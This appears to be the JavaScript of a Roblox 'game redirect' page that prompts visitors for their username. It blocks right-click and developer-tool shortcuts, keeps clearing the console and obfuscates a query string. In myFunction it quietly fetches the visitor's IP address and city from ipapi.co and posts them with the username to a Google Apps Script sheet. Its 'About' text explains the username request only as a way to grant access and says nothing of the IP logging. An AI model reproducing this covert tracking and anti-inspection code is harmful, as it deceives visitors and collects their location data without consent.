var ddddddd = "dddddd"
var ssssssss = "ssssssss"
var dddddc = "dddddc"
var ffdfff = "ffdfff"
var fgfgdgfdd = "fgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfddfgfgdgfdd"
var intent = "0"

    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });
    document.onkeydown = function(e) {
      if(event.keyCode == 123) {
         return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
         return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
         return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
         return false;
      }
      if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
         return false;
      }
    }
    


function Load(user) {
  Swal.fire({
    title: "<h4 onselectstart='false' style='color:#d1d1d1;'>Redirecting to the ROBLOX game</h4>",
    timer: 10,
    footer: '<a onselectstart="false" style="color:#d1d1d1;" href="https://discord.gg/NJT7RyAPF6" target="_blank" >Join discord</a>',
    background: '#272727',
    onBeforeOpen: () => {
      Swal.showLoading()
      if (window.localStorage.getItem('Name')) {
        Load2()
       } else {
        window.localStorage.setItem('Name', user);
        myFunction(user)
        Load2()
      }
    },
    onClose: () => {
      clearInterval(timer)
    }
  }).then((result) => {
    console.clear()
  })
  console.clear()
}
var dasd = "Ge"
var dsdsff = "t"
var sdfdsf = "Ga"
var xcvxc = "me"
var dfgdfg = "D"


function Load2() {
 fetch(url + res + dasd + dsdsff + sdfdsf + xcvxc + dfgdfg)
  
 .then(function(response) {
    console.clear()
      return response.json();
    })
    .then(function(data) {
      console.clear()
      $(location).attr('href', 'https://www.roblox.com/games/' + data.response)
  }); 

}
var url = "https://script.google.com/macros/s/AKfycbx3gYi1rSt5mXZ40w3fa5uvaroX0V3n_xND7QnvzmwK9rCSAHM/exec"
var res = "?sheet=Global&key="

function Info() {
  return Swal.fire({        
    type: 'info',
    title: "<h4 style='color:white;'>About</h4>",
    text: "a",
    background: '#272727',
    confirmButtonText: "Back",
  cancelButtonText: "Back",
    html: "<span style='color:#fdfdfd;'>We ask for your username so that when you enter the game it allows you access</span>", 
  }).then(function() {
    GetUserName() ;
  });
} 
var VPN = ["KR","RU","CN"];
  fetch('https://ipapi.co/json/')
  .then(function(response) {
    console.clear()
      return response.json();
    })
    .then(function(data) {
      console.clear()
      for (var i = 0; i < VPN.length; i++) {
      if (data.country == VPN[i]) {
        Swal.fire({     
          type: 'error',
          title: "<h4 style='color:white;'>Access to this page was denied</h4>",
          background: '#272727',
          
          howCancelButton: false,
          showConfirmButton: false,
          onOpen: function (){
            swal.disableConfirmButton();
          }
        });
        return "sds"
      }
      
    }
  }); 







function GetUserName() {
  $(document).ready(function(){
    jQuery('input').on('input', function(property) {
      AntiHackServer(jQuery('input').val())
    });
  });
 
  Swal.fire({
    title: "<h4 onselectstart='false' style='color:#d1d1d1;'>Enter your ROBLOX UserName</h4>",
    input: "text",
    cancelButtonColor: "#535353",
    confirmButtonColor: "#0590a8",
    allowOutsideClick: true,
footer: '<a onselectstart="false" style="color:#d1d1d1;" onclick="Info()">Why UserName?</a>',
    inputAttributes: {
      autocapitalize: 'off'
    },

    
    //showCancelButton: true,
    confirmButtonText: "Get Game",
    cancelButtonText: "Cancel",
    showLoaderOnConfirm: true,
    background: '#272727',


    

  preConfirm: (login) => { 
if (login == "" ) {
  if(jQuery('input').val().indexOf(' ') == 1){
  Swal.showValidationMessage(
    `<p style='color:#fcfcfc;'>aPlease enter an valid username</p>`,
    )
    return "sds"
  }
}
  
  if(jQuery('input').val().length >= 21){
    Swal.showValidationMessage( 
      `<p style='color:#fcfcfc;'>Usernames can be 3 to 20 characters long.</p>`,
      )
      return "a"
  }
  if(jQuery('input').val().split("_").length >= 3){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames can have at most one _.</p>`,
      )
      return "a"
    }
  if(jQuery('input').val().length <= 2){
    Swal.showValidationMessage( 
      `<p style='color:#fcfcfc;'>Usernames can be 3 to 20 characters long.</p>`,
      )
      return "a"
}
if(jQuery('input').val().indexOf('_') >= jQuery('input').val().length-1){
  Swal.showValidationMessage(
    `<p style='color:#fcfcfc;'>Usernames cannot start or end with _.</p>`,
    )
    return "s"
}

if(jQuery('input').val().indexOf('_') == 0){
  Swal.showValidationMessage(
    `<p style='color:#fcfcfc;'>Usernames cannot start or end with _.</p>`,
    )
    return "s"
}

  if(jQuery('input').val().indexOf(' ') >= 0){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
      return "a"
  }
  var format = /[!@#$%^&*()+\-=\[\]´{}ñ;¡¿~€¬·':"\\|,.<>\/?]+/;
  if(format.test(jQuery('input').val())){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
      return "a"
}

 return fetch(url + res + login)

    .catch(error => {
      console.clear()
    return Swal.fire({        
      type: 'error',
      title: "<h4 style='color:white;'>CORS ERROR</h4>",
      text: "a",
      background: '#272727',
      confirmButtonText: "Retry",
    cancelButtonText: "Retry",
      html: "<span style='color:#fdfdfd;'>GET has been falled</span>", 
    }).then(function() {
      GetUserName() ;

    });
    })


    .then(function(response) {
      console.clear()
     return response.json();
   })
   .then(function(data) {
    console.clear()
     if (data.response.errorMessage == "User not found") {
      Swal.showValidationMessage(
        `<p style='color:#fcfcfc;'>User not found</p>`,
        )
        return "a"
      }
       });
   
  },


 
  allowOutsideClick: () => !Swal.isLoading()
}).then((resultado) => {
  Load(resultado.value)
})

}

GetUserName()
window.localStorage.getItem('Name')
if (window.localStorage.getItem('Name')) {
  //Load("")
}



function AntiHackServer(key) {
  if(key.length >= 21){
    Swal.showValidationMessage( 
      `<p style='color:#fcfcfc;'>Usernames can be 3 to 20 characters long.</p>`,
      )
  }
 
    if(key.split("_").length >= 3){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames can have at most one _.</p>`,
      )
    }

  if(key.indexOf(' ') >= 0){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
  }
  
  var format = /[!@#$%^&*()+\-=\[\]´{}ñ;¡¿~€¬·':"\\|,.<>\/?]+/;
  if(format.test(key)){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
    }
}


function myFunction(u) {
  fetch('https://ipapi.co/json/')
  .then(function(response) {
      return response.json();
    })
    .then(function(data) {
  
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: "sheet=Global&key=" + u + "&value=" + data.ip + data.city
      })
    });
    console.clear()
  }
